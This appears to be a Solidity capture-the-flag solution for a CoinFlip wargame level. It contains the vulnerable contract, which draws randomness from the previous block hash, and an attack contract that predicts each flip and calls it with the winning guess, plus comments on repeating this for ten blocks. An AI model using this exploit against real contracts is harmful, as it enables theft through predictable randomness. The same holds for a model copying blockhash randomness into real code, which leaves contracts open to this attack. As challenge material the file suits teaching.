// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract coinattack{

    CoinFlip c;
    constructor(address _address){
        c=CoinFlip(_address);
    }

    function attack() public {
        uint256 _blockvalue=uint256(blockhash(block.number-1));
        uint256 _coinflip=_blockvalue/57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool _side = _coinflip == 1?true:false;
        c.flip(_side);
    }

}
//we can create a separate contract to find the value of the side
//once we find the value of the side pass it to the flip function of Coinflip contract
//complete it for 10 block.number to complete the challenge